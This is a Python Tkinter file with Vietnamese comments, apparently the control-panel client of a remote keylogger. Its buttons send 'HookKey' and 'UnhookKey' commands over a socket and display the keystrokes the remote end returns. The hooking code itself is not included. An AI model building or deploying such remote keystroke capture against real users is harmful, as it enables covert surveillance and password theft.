from tkinter import Tk, W, E
from tkinter import Tk, Text, TOP, BOTH, X, N, LEFT
from tkinter.ttk import Frame, Label, Button, Entry
from tkinter import *

def keystroke(client):
	# Tạo ra cửa sổ của Keystroke
		keylogger = ''												# Biến lưu trữ những gõ bàn phím
		Stroke = Tk()											# Tạo ra cửa sổ
		Stroke.title("Keystroke")  								# Đặt tiêu đề của cửa sổ
		Stroke.geometry("425x320")								# Đặt kích thước của cửa sổ
		Stroke.configure(bg ='#fff')							# Đặt màu nền của cửa sổ
		Stroke.resizable(False, False)							# Không cho phép thay đổi kích thước cửa sổ

		tab = Text(Stroke, width = 50, heigh = 15)				# Tạo ra một Textbox
		tab.grid(row = 3, column = 0, columnspan= 4)			# Đặt Textbox vào cửa sổ
		HookClicked = False										# Biến kiểm tra xem có đang nhấn phím hay không
		UnhookClicked = False									# Biến kiểm tra xem có đang nhấn phím hay không

		def ReceiveHook(client):
			data = client.recv(1024).decode("utf-8")			# Nhận dữ liệu từ server
			# recv(): 	Phương thức này nhận TCP message.
			client.sendall(bytes(data,"utf-8"))  				# Gửi dữ liệu đến server
			return data											# Trả về dữ liệu nhận được
	# Hàm lắng nghe bàn phím
		def Hookkey():	
			nonlocal HookClicked, UnhookClicked
			if HookClicked == True: return						# Nếu như nút Hook đã được nhấn thì không thực hiện gì cả
			HookClicked = True									# Nếu như nút Hook chưa được nhấn thì thực hiện các lệnh sau
			UnhookClicked = False								# Nút Unhook chưa được nhấn
			client.sendall(bytes("HookKey","utf-8"))			# Gửi dữ liệu đến server
			checkdata = client.recv(1024).decode("utf-8")		# Nhận dữ liệu từ server
	# Hàm dừng lắng nghe bàn phím
		def Unhookkey():
			nonlocal keylogger, UnhookClicked, HookClicked			# Khai báo biến keylogger, HookClicked, UnhookClicked
			if HookClicked == True:								# Nếu như nút Hook đã được nhấn thì không thực hiện gì cả
				client.sendall(bytes("UnhookKey","utf-8"))    	# Gửi dữ liệu đến server
				keylogger = ReceiveHook(client)					# Nhận dữ liệu từ server
				client.sendall(bytes(keylogger,"utf-8")) 			# Gửi dữ liệu đến server
				UnhookClicked = True							# Nút Unhook đã được nhấn
				HookClicked = False								# Nút Hook chưa được nhấn
	# In khóa ra màn hình
		def Printkey():
			nonlocal keylogger, UnhookClicked, HookClicked			# Khai báo biến keylogger, HookClicked, UnhookClicked
			if UnhookClicked == False: 							# Nếu như nút Unhook chưa được nhấn thì thực hiện các lệnh sau
				client.sendall(bytes("UnhookKey","utf-8"))		# Gửi dữ liệu đến server
				keylogger = ReceiveHook(client)					# Nhận dữ liệu từ server
			tab.delete(1.0, END)								# Xóa toàn bộ dữ liệu trong Textbox
			tab.insert(1.0, keylogger)								# Đưa dữ liệu vào Textbox
			UnhookClicked = True								# Nút Unhook đã được nhấn
			HookClicked = False									# Nút Hook chưa được nhấn
	# Làm sạch màn hình
		def Deletekey():										# Hàm xóa toàn bộ dữ liệu trong Textbox
			tab.delete(1.0,END)									# Xóa toàn bộ dữ liệu trong Textbox
					    
		hook = Button(Stroke, text = "Hook", font = "Helvetica 10 bold",width=6, bg = "#8DDDE0", activebackground='#497172', padx = 17, pady = 20, command = Hookkey).grid(row = 1,column = 0,sticky=E)
		unhook = Button(Stroke, text = "Unhook",font = "Helvetica 10 bold",width=6 , bg = "#F9BDC0", activebackground='#7e5a5c', padx = 17, pady = 20, command = Unhookkey).grid(row = 1,column = 1,sticky=E) 
		print = Button(Stroke, text = "Print",font = "Helvetica 10 bold",width=6 ,bg = "#FBE698", activebackground='#776d47', padx = 17, pady = 20,command = Printkey).grid(row = 1,column = 2,sticky=E)
		delete = Button(Stroke, text = "Delete", font = "Helvetica 10 bold",width=6 , bg = "#8B795E", activebackground='#3f302a',padx = 17, pady = 25,command = Deletekey).grid(row = 1,column = 3,sticky=E)